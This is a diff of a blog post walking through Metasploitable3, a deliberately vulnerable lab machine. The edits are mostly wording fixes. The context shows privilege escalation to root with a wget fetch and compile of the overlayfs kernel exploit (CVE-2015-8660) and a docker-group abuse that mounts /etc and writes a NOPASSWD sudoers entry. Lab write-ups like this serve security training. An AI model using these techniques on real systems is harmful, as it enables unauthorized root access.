@@ -21,7 +21,7 @@ tags:
 
 ## Summary
 
-Metasploitable3 is a free vulnerable machine - either in a Linux or Windows version - that allows you to simulate attacks largely using metasploit. However, I will mainly avoid using metasploit and rather do it manually to further enhance my skillset. I will randomly pick a service to exploit so I can write multiple blogs in this metasploitable 3 series. In this blog, we will be exploiting UnrealIRC Service.
+Metasploitable3 is a free vulnerable machine - either in a Linux or Windows version - that allows you to simulate attacks largely using metasploit. However, I will mainly avoid using metasploit and rather do it manually to further enhance my skillset. I will randomly pick a service to exploit so I can write multiple blogs in this metasploitable 3 series. In this blog, we will be exploiting UnrealIRC Service to gain a shell and use 2 different ways to escalate privilege to root.
 
 ## Box Details
 
@@ -293,7 +293,7 @@ boba_fett@metasploitable3-ub1404:~$
 
 After running the enumeration scripts, are few things popped out for me:
 
-##### Kernel Exploits - There were some kernel exploits available for this operating system
+##### Kernel Exploits - There were some kernel exploits available for this kernel version
 
 ```
 boba_fett@metasploitable3-ub1404:~$ perl linux-exploit-suggester-2.pl 
@@ -325,7 +325,7 @@ boba_fett@metasploitable3-ub1404:~$ perl linux-exploit-suggester-2.pl
 boba_fett@metasploitable3-ub1404:~$ 
 ```
 
-##### The user boba_fett belongs the docker group and this can be leaveraged to obtain a root shell if the docker setting settings aren't properly configured
+##### The user boba_fett belongs the docker group and this can be leaveraged to obtain a root shell if the docker settings aren't properly configured
 
 ```
 [!] ctn020 Is the user a member of the 'docker' group?..................... yes!
@@ -334,9 +334,9 @@ docker
 ---
 ```
 
-#### Gaining root using the kernel exploit overlays(CVE-2015-8660)
+### Gaining root using the kernel exploit overlays(CVE-2015-8660)
 
-We can go ahead and download the overlays exploit from [here](http://www.exploit-db.com/exploits/39230), send it over to the victim machine and then compile the script to an executable and run it so as to gain the root shell:
+We can go ahead and download the overlayfs exploit from [here](http://www.exploit-db.com/exploits/39230), send it over to the victim machine and then compile the script to an executable and run it so as to gain the root shell:
 
 ```
 boba_fett@metasploitable3-ub1404:~$ wget http://192.168.4.129/overlay.c
@@ -370,7 +370,7 @@ uid=0(root) gid=0(root) groups=0(root),100(users),999(docker)
 # 
 ```
 
-#### Gaining root taking advantage to the docker group
+### Gaining root taking advantage to the docker group
 
 With user boba_fett in the docker group, we can issue docker commands without any restrictions. I will use docker command `docker images` to list the docker images on the system
 
@@ -383,7 +383,7 @@ krustyhack/docker-privesc   latest              6b5ae09db018        2 years ago 
 boba_fett@metasploitable3-ub1404:~$ 
 ```
 
-From this printout I can see we have an `Ubuntu` image on the system. The attack vector that straight away comes to mind to is to map the `/etc/` directory to a directory `/root/` within the docker container. Within the container, I'll have access as root and be able to add user `boba_fett` into the sudoers file so he can issue all commands with the `sudo` without knowing his passwprd and therefore go on the get a root shell using `sudo bash`.
+From this printout I can see we have an `Ubuntu` image on the system. The attack vector that straight away comes to mind to is to map the `/etc/` directory to a directory `/root/` within the docker container. Within the container, I'll have access as root and be able to add user `boba_fett` into the sudoers file so he can issue all commands with the `sudo` without knowing his password and therefore go on and get a root shell using `sudo bash`.
 
 To run a container and mount the `/etc` directory, I will use the following command, `docker run -dit -v /etc:/root ubuntu` and I can check the running container using `docker ps`
 
@@ -412,7 +412,7 @@ boba_fett:x:1121:100::/home/boba_fett:/bin/bash
 root@5918a86e9463:~# 
 ```
 
-From the printout above, it's clear we have root access in the docker container and have successfully mounted the `/etc/` directory in the `root` directory. A simple grep on the `passwd` file, we can found our user's name. 
+From the printout above, it's clear we have root access in the docker container and have successfully mounted the `/etc/` directory in the `root` directory. A simple grep on the `passwd` file, we found our user's name. 
 
 To edit the `sudoers` file, we will use the `echo` to append the following information to enable user `boba_fett` issue sudo commands without any password: `echo "boba_fett ALL=(ALL) NOPASSWD: ALL" >> sudoers`. We can confirm this has been appended to the file by reading the file using `cat sudoers`.
 
@@ -453,7 +453,7 @@ boba_fett ALL=(ALL) NOPASSWD: ALL
 root@5918a86e9463:~# 
 ```
 
-With this done, we can exit the container and simply issue `sudo bash` to gain a root shell
+With this done, we can exit the container and simply issue `sudo bash` on the host victim to gain a root shell
 
 ```
 root@5918a86e9463:~# exit
